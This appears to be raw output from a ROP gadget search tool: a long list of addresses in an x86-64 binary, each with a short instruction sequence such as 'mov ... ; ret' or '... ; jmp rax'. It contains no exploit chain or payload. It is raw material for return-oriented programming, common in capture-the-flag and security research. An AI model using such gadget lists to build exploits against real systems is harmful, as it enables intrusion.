0x00000000004aff63 : mov bl, 0x8e ; ret 0xdcd9
0x000000000041c5d3 : mov bl, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000049b425 : mov bl, 0xf9 ; call qword ptr [rax]
0x000000000049b408 : mov bpl, 0xf9 ; inc dword ptr [rax - 0x49] ; stc ; call rax
0x0000000000454f5a : mov byte ptr [r8 - 0x7d], r9b ; ret 0x4830
0x0000000000452c0a : mov byte ptr [rax + 0x28], 1 ; ret
0x00000000004b6e84 : mov byte ptr [rax + rax], al ; cmp byte ptr [rdx], bh ; stc ; jmp qword ptr [rbx]
0x0000000000454f5b : mov byte ptr [rax - 0x7d], cl ; ret 0x4830
0x000000000045266f : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000407704 : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004757e7 : mov byte ptr [rcx + 0xf], 0x4f ; ret
0x0000000000460ac3 : mov byte ptr [rcx + rax - 0x3a], cl ; jmp rsi
0x00000000004919f4 : mov byte ptr [rcx + rax - 0x40], cl ; jmp rax
0x00000000004ab0c0 : mov byte ptr [rcx - 0x4e770004], dh ; cld ; jmp qword ptr [rax]
0x00000000004ab054 : mov byte ptr [rcx - 0x4fdf0004], dh ; cld ; jmp qword ptr [rax]
0x000000000040c71f : mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000465643 : mov byte ptr [rcx], cl ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000044b3b8 : mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x000000000044ad28 : mov byte ptr [rdi + 0x10], dh ; ret
0x000000000044b42e : mov byte ptr [rdi + 0x14], dh ; lea rax, qword ptr [rdi + 0x14] ; ret
0x000000000044ad7e : mov byte ptr [rdi + 0x14], dh ; ret
0x000000000044b4b0 : mov byte ptr [rdi + 0x18], dh ; lea rax, qword ptr [rdi + 0x18] ; ret
0x000000000044ae00 : mov byte ptr [rdi + 0x18], dh ; ret
0x000000000044b266 : mov byte ptr [rdi + 2], dh ; lea rax, qword ptr [rdi + 2] ; ret
0x000000000044ac46 : mov byte ptr [rdi + 2], dh ; ret
0x000000000044b282 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x000000000044ac62 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x000000000044aca3 : mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000435f1b : mov byte ptr [rdi - 1], dl ; ret
0x0000000000419420 : mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x000000000043f042 : mov byte ptr [rdi], cl ; ret
0x000000000044e925 : mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044b240 : mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x000000000044ac20 : mov byte ptr [rdi], dh ; ret
0x000000000043c373 : mov byte ptr [rdi], dl ; ret
0x000000000044a779 : mov byte ptr [rdx + 2], al ; lea rax, qword ptr [rdx + 2] ; ret
0x0000000000448fc9 : mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x000000000044a7a7 : mov byte ptr [rdx + 4], al ; lea rax, qword ptr [rdx + 4] ; ret
0x0000000000448fe7 : mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x00000000004ba5b8 : mov byte ptr [rdx], al ; cld ; jmp qword ptr [rbx]
0x000000000044a752 : mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x0000000000448fa2 : mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x0000000000492560 : mov byte ptr [rip + 0x231c89], 8 ; ret
0x0000000000400b46 : mov byte ptr [rip + 0x2c2793], 1 ; pop rbp ; ret
0x00000000004246f9 : mov byte ptr [rsi + rbx], cl ; mov rax, rsi ; pop rbx ; ret
0x00000000004b2998 : mov byte ptr [rsi + rdi*8], bh ; jmp rax
0x00000000004bc084 : mov byte ptr [rsi - 0x6980000], dl ; cld ; jmp rdx
0x000000000048b31f : mov byte ptr [rsi], al ; jne 0x48b30f ; mov rax, rsi ; ret
0x000000000048b3a3 : mov byte ptr [rsi], al ; jne 0x48b387 ; mov rax, rsi ; ret
0x00000000004b7884 : mov byte ptr [rsi], cl ; add byte ptr [rax - 0x68], bl ; stc ; jmp qword ptr [rcx]
0x00000000004975cc : mov ch, 0x22 ; add byte ptr [rcx + rcx*4 + 0x2d], cl ; ret 0x22b4
0x00000000004ad9a2 : mov ch, 0x31 ; mov ah, bl ; push rsi ; ret
0x00000000004aece3 : mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x0000000000415cc2 : mov ch, 0x41 ; mov ebx, 1 ; jmp 0x415c95
0x0000000000463c5a : mov ch, 0x41 ; mov ebx, 1 ; jmp 0x463c2d
0x00000000004b007f : mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00000000004b0a2a : mov ch, 0xab ; ret
0x0000000000477ff7 : mov ch, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000040349e : mov ch, 0xe9 ; pop rbx ; ret 0x3956
0x000000000049b3c9 : mov ch, 0xf9 ; call qword ptr [rax + 0x20fff9b7]
0x000000000049b429 : mov ch, 0xf9 ; call qword ptr [rax]
0x000000000049b409 : mov ch, 0xf9 ; inc dword ptr [rax - 0x49] ; stc ; call rax
0x0000000000433c36 : mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000049b421 : mov cl, 0xf9 ; call qword ptr [rax]
0x000000000049b441 : mov cl, 0xf9 ; call rax
0x00000000004ab055 : mov cl, 0xfc ; jmp qword ptr [rax]
0x000000000049b2dd : mov cl, bh ; jmp qword ptr [rsi + 0x26fff989]
0x000000000049b27d : mov cl, bh ; push qword ptr [rax - 0x7a] ; stc ; jmp qword ptr [rax]
0x00000000004616c7 : mov cl, byte ptr [rax + 0x39] ; ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x0000000000441825 : mov cl, byte ptr [rbx - 0x37d67dfc] ; ret
0x000000000042b364 : mov cl, byte ptr [rdi - 0x73] ; adc al, 0xa ; jmp r10
0x00000000004afe52 : mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x0000000000432a84 : mov cl, byte ptr [rsi + rdx - 1] ; sub eax, ecx ; ret
0x000000000043f040 : mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000047b45b : mov cl, dl ; and cl, 0xf ; je 0x47b487 ; ret
0x00000000004b010c : mov cs, edi ; ret 0x8b36
0x000000000046ed12 : mov cs, word ptr [rdx - 0x77000000] ; ror byte ptr [rcx - 0x77], cl ; ret
0x0000000000445dae : mov cs, word ptr [rip - 0x7cb80000] ; ret 0xe910
0x000000000044ac40 : mov cx, word ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000048b44a : mov dh, 0 ; add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x0000000000494c1f : mov dh, 0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041d1e2 : mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004196cf : mov dh, 0 ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000041f270 : mov dh, 0 ; ret
0x000000000043c371 : mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x00000000004325d4 : mov dh, 0x16 ; sub eax, edx ; ret
0x0000000000414464 : mov dh, 0x17 ; test dl, dl ; jne 0x41444a ; ret
0x00000000004757fc : mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x0000000000414389 : mov dh, 0x40 ; or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x000000000045d4f2 : mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000047013b : mov dh, 0x46 ; or al, 0x83 ; ret
0x000000000044cb31 : mov dh, 0x47 ; cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x000000000044cb21 : mov dh, 0x47 ; hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x000000000044caf1 : mov dh, 0x47 ; int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x000000000044cb11 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x000000000044cb01 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x0000000000464d39 : mov dh, 0x47 ; or al, 0x83 ; ret
0x00000000004aee42 : mov dh, 0x4e ; ret 0x474c
0x000000000044cb35 : mov dh, 0x56 ; cmc ; sub eax, edx ; ret
0x000000000044cb25 : mov dh, 0x56 ; hlt ; sub eax, edx ; ret
0x000000000044caf5 : mov dh, 0x56 ; int1 ; sub eax, edx ; ret
0x000000000044cb05 : mov dh, 0x56 ; sub eax, edx ; ret
0x0000000000469fa8 : mov dh, 0x67 ; or al, 0x89 ; ret 0xc689
0x000000000040c8ba : mov dh, 0x73 ; add dword ptr [rax - 0x77], ecx ; ret
0x0000000000415824 : mov dh, 0x73 ; add dword ptr [rax - 0x7d], ecx ; ret
0x000000000047f8af : mov dh, 0x87 ; adc eax, 0x89000003 ; ret 0xe8c0
0x000000000049b2f8 : mov dh, 0x8c ; stc ; inc dword ptr [rsi - 0x73] ; stc ; call rsi
0x000000000047c462 : mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x0000000000492c66 : mov dh, 0xc0 ; movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x0000000000475578 : mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x000000000048efbd : mov dh, 0xc0 ; neg eax ; ret
0x000000000048b88a : mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401dfb : mov dh, 0xc0 ; ret
0x0000000000455431 : mov dh, 0xc0 ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000044ec11 : mov dh, 0xc1 ; pop rbx ; ret
0x000000000041bfe2 : mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004b0084 : mov dh, 0xc7 ; ret 0xe71f
0x00000000004919ef : mov dh, 0xc9 ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x00000000004325fa : mov dh, 0xd2 ; sub eax, edx ; ret
0x000000000049319f : mov dh, 0xdb ; movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x000000000044da39 : mov dh, 0xe ; mov byte ptr [rdi], cl ; ret
0x000000000042c711 : mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x0000000000432a94 : mov dh, 0xe ; sub eax, ecx ; ret
0x000000000049b46d : mov dh, 0xf9 ; jmp qword ptr [rax]
0x000000000049b48d : mov dh, 0xf9 ; jmp rax
0x0000000000413ec5 : mov dh, 0xfa ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x00000000004962b7 : mov dh, 0xff ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d1f1 : mov dh, 2 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004196e1 : mov dh, 2 ; ret
0x0000000000432a91 : mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00000000004325d1 : mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x000000000042c714 : mov dh, 7 ; sub eax, ecx ; ret
0x000000000044f1bc : mov dh, byte ptr [rcx - 0xd] ; ret
0x000000000049b40c : mov dil, 0xf9 ; call rax
0x000000000049bed8 : mov dl, 0x28 ; cli ; jmp qword ptr [rdx]
0x000000000049bcec : mov dl, 0x2f ; cli ; inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x000000000048e321 : mov dl, 0x68 ; and eax, dword ptr [rax] ; jne 0x48e355 ; ret
0x000000000049b4a5 : mov dl, 0xf9 ; call qword ptr [rax]
0x000000000049b445 : mov dl, 0xf9 ; call rax
0x000000000049b7f4 : mov dl, 8 ; cli ; inc dword ptr [rdx + 8] ; cli ; call rdx
0x00000000004b8f11 : mov dl, bh ; call qword ptr [rcx]
0x00000000004b8ef9 : mov dl, bh ; call qword ptr [rdi]
0x0000000000435fa0 : mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000469185 : mov ds, word ptr [rax + rax + 0x63490000] ; ret 0x8944
0x000000000043f036 : mov dword ptr [r9 - 2], ecx ; ret
0x000000000043f021 : mov dword ptr [r9 - 4], ecx ; ret
0x0000000000452ba1 : mov dword ptr [rax + 0x10], ecx ; mov qword ptr [rax + 8], rdx ; ret
0x0000000000477639 : mov dword ptr [rax + 0x10], edx ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000477679 : mov dword ptr [rax + 0x10], esi ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000478678 : mov dword ptr [rax + 0x18], edx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x0000000000452c07 : mov dword ptr [rax + 0x20], ecx ; mov byte ptr [rax + 0x28], 1 ; ret
0x0000000000452c21 : mov dword ptr [rax + 0x20], esi ; ret
0x000000000047763d : mov dword ptr [rax + 0x40], ecx ; ret
0x00000000004786fa : mov dword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x00000000004576df : mov dword ptr [rax + 0x50], ecx ; mov dword ptr [rax + 0x54], edx ; ret
0x00000000004576e2 : mov dword ptr [rax + 0x54], edx ; ret
0x000000000041df05 : mov dword ptr [rax + 8], 0 ; ret
0x0000000000452ba5 : mov dword ptr [rax + 8], edx ; ret
0x000000000046cbbd : mov dword ptr [rax], 0x16 ; mov eax, edx ; ret
0x0000000000415bb2 : mov dword ptr [rax], 0x16 ; xor eax, eax ; ret
0x000000000042472a : mov dword ptr [rax], 0xc ; mov rax, rsi ; ret
0x000000000048ba4d : mov dword ptr [rax], edi ; pop rbx ; ret
0x000000000048b99d : mov dword ptr [rax], edx ; add rsp, 8 ; ret
0x0000000000421232 : mov dword ptr [rax], edx ; mov rax, rdx ; add rsp, 8 ; ret
0x000000000048ba41 : mov dword ptr [rax], edx ; pop rbx ; ret
0x0000000000493dd2 : mov dword ptr [rax], edx ; ret
0x00000000004789eb : mov dword ptr [rax], edx ; xor eax, eax ; ret
0x00000000004832c1 : mov dword ptr [rbp - 0x100], ebx ; call r10
0x0000000000474143 : mov dword ptr [rbp - 0x510], eax ; call 0x400438
0x000000000047032f : mov dword ptr [rbp - 0x910], esi ; jmp qword ptr [rdx + rax*8]
0x0000000000483c61 : mov dword ptr [rbp - 0xe0], ebx ; call r10
0x000000000045f3b2 : mov dword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x00000000004194f7 : mov dword ptr [rbx + 0x10], eax ; mov rax, rbx ; pop rbx ; ret
0x000000000048889e : mov dword ptr [rbx + 0x10], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x00000000004198df : mov dword ptr [rbx + 0x10], eax ; xor eax, eax ; pop rbx ; ret
0x00000000004865ae : mov dword ptr [rbx + 0x10], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048c753 : mov dword ptr [rbx + 0x18], 0 ; jmp 0x48c727
0x00000000004887d3 : mov dword ptr [rbx + 0x18], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000048efe5 : mov dword ptr [rbx + 0x18], eax ; pop rbx ; ret
0x000000000048f0b9 : mov dword ptr [rbx + 0x20], eax ; pop rbx ; ret
0x000000000046195d : mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x000000000041d59d : mov dword ptr [rbx + 0x40], esp ; mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d081 : mov dword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x00000000004788aa : mov dword ptr [rbx + 0x60], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041ed1d : mov dword ptr [rbx + 0x60], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041b0b2 : mov dword ptr [rbx + 0x70], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004776c4 : mov dword ptr [rbx + 0x74], eax ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000478571 : mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045f3c7 : mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000048c213 : mov dword ptr [rbx], eax ; add rsp, 0x10 ; pop rbx ; ret
0x000000000041d52c : mov dword ptr [rbx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000491019 : mov dword ptr [rbx], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000041d5a0 : mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004193f5 : mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000492562 : mov dword ptr [rbx], ebx ; add byte ptr [rax], cl ; ret
0x000000000047867b : mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x0000000000416a61 : mov dword ptr [rcx + 0x130], edx ; ret
0x00000000004076be : mov dword ptr [rcx + rax*2], 0x72f2a30f ; ret 0xfe83
0x00000000004023eb : mov dword ptr [rcx - 0x3f], 0x894106cd ; ret 0x2141
0x0000000000452093 : mov dword ptr [rcx - 0x76b7fffe], ebx ; ret
0x0000000000457a35 : mov dword ptr [rcx - 0x7d], 0x940f07fc ; ret 0x1f0f
0x000000000043f037 : mov dword ptr [rcx - 2], ecx ; ret
0x000000000043f022 : mov dword ptr [rcx - 4], ecx ; ret
0x000000000043f011 : mov dword ptr [rcx - 8], ecx ; ret
0x00000000004506e4 : mov dword ptr [rcx], eax ; mov eax, 0xffffffff ; jmp 0x4506b7
0x000000000045000a : mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x000000000041fc64 : mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x000000000044b3cd : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x000000000044b40b : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x000000000044b48d : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x000000000044ad7b : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x000000000044adfd : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x18], dh ; ret
0x000000000044ad3d : mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000044ae40 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000044ae60 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000044ae21 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; ret
0x000000000044b4f3 : mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x000000000044ae43 : mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000041cf63 : mov dword ptr [rdi + 0x18], eax ; mov qword ptr [rdi + 8], rax ; ret
0x000000000044b4d5 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x19] ; ret
0x000000000044b513 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x000000000044ae25 : mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000041fc61 : mov dword ptr [rdi + 0x24], ebp ; mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x0000000000482265 : mov dword ptr [rdi + 0x300], eax ; ret
0x0000000000482237 : mov dword ptr [rdi + 0x308], eax ; ret
0x000000000041cf93 : mov dword ptr [rdi + 0x48], edx ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000493e11 : mov dword ptr [rdi + 0x98], esi ; ret
0x000000000044b44d : mov dword ptr [rdi + 0xe], ecx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x000000000044ad9d : mov dword ptr [rdi + 0xe], ecx ; ret
0x000000000044b3eb : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x000000000044b46d : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x000000000044ad5b : mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000043c1b5 : mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043bff8 : mov dword ptr [rdi + 1], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000043c298 : mov dword ptr [rdi + 1], edx ; mov word ptr [rdi], cx ; ret
0x000000000043c145 : mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043bf88 : mov dword ptr [rdi + 2], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044b2b7 : mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 6] ; ret
0x000000000043c0d5 : mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043bf18 : mov dword ptr [rdi + 3], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044ac87 : mov dword ptr [rdi + 3], edx ; ret
0x000000000044b299 : mov dword ptr [rdi + 4], edx ; lea rax, qword ptr [rdi + 5] ; ret
0x000000000043bea8 : mov dword ptr [rdi + 4], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044ac79 : mov dword ptr [rdi + 4], edx ; ret
0x000000000044b34b : mov dword ptr [rdi + 5], edx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x000000000043be38 : mov dword ptr [rdi + 5], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044aceb : mov dword ptr [rdi + 5], edx ; ret
0x000000000044b36b : mov dword ptr [rdi + 6], edx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x000000000043bdc8 : mov dword ptr [rdi + 6], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044acfb : mov dword ptr [rdi + 6], edx ; ret
0x000000000044b309 : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x000000000044b38b : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x000000000043bd58 : mov dword ptr [rdi + 7], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000044acc9 : mov dword ptr [rdi + 7], edx ; ret
0x000000000048b26e : mov dword ptr [rdi + 8], eax ; mov eax, 2 ; ret
0x000000000041cf67 : mov dword ptr [rdi + 8], eax ; ret
0x0000000000489a84 : mov dword ptr [rdi + 8], ecx ; ret
0x000000000044b329 : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x000000000044b2eb : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 9] ; ret
0x000000000048af24 : mov dword ptr [rdi + 8], edx ; mov eax, ecx ; adc eax, eax ; ret
0x000000000044acbb : mov dword ptr [rdi + 8], edx ; ret
0x000000000044e7cb : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], cx ; ret
0x000000000044da65 : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], si ; ret
0x000000000044e7c3 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; ret
0x000000000044e945 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x000000000044da55 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000044e7bb : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rcx ; ret
0x000000000044da47 : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rsi ; ret
0x0000000000493dbc : mov dword ptr [rdi + rsi*8], edx ; ret
0x0000000000435c65 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000435ca3 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004899ef : mov dword ptr [rdi - 0x10], ecx ; ret
0x0000000000435fec : mov dword ptr [rdi - 0xa], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b808 : mov dword ptr [rdi - 0xa], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004361cc : mov dword ptr [rdi - 0xb], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b788 : mov dword ptr [rdi - 0xb], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004363bc : mov dword ptr [rdi - 0xc], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b708 : mov dword ptr [rdi - 0xc], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043658d : mov dword ptr [rdi - 0xd], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b679 : mov dword ptr [rdi - 0xd], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043678d : mov dword ptr [rdi - 0xe], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b5e9 : mov dword ptr [rdi - 0xe], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043698d : mov dword ptr [rdi - 0xf], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b559 : mov dword ptr [rdi - 0xf], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043636d : mov dword ptr [rdi - 2], ecx ; ret
0x0000000000436185 : mov dword ptr [rdi - 2], edx ; ret
0x0000000000436369 : mov dword ptr [rdi - 3], edx ; mov word ptr [rdi - 2], cx ; ret
0x0000000000436749 : mov dword ptr [rdi - 4], ecx ; ret
0x0000000000435e1f : mov dword ptr [rdi - 4], edx ; ret
0x0000000000436746 : mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436946 : mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436b46 : mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000435c69 : mov dword ptr [rdi - 8], ecx ; ret
0x0000000000435ca7 : mov dword ptr [rdi - 8], edx ; ret
0x0000000000435e1c : mov dword ptr [rdi - 9], eax ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435f18 : mov dword ptr [rdi - 9], ecx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000435e64 : mov dword ptr [rdi - 9], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b888 : mov dword ptr [rdi - 9], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000489974 : mov dword ptr [rdi], eax ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000489a7e : mov dword ptr [rdi], eax ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x000000000046f33a : mov dword ptr [rdi], ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000044b285 : mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x000000000044b2d7 : mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 8] ; ret
0x000000000044b264 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; lea rax, qword ptr [rdi + 2] ; ret
0x000000000044ac44 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000044b2b5 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 6] ; ret
0x000000000044ac85 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x000000000044b307 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x000000000044acc7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; ret
0x000000000044b327 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x000000000044acd7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; ret
0x000000000044d797 : mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x000000000044ace8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; ret
0x000000000044acf8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; ret
0x000000000044ad08 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; ret
0x000000000044ac76 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x000000000044acb8 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; ret
0x000000000044d7a3 : mov dword ptr [rdi], ecx ; mov word ptr [rsi - 2], cx ; ret
0x000000000043bd5c : mov dword ptr [rdi], ecx ; ret
0x000000000044e93f : mov dword ptr [rdi], ecx ; vzeroupper ; ret
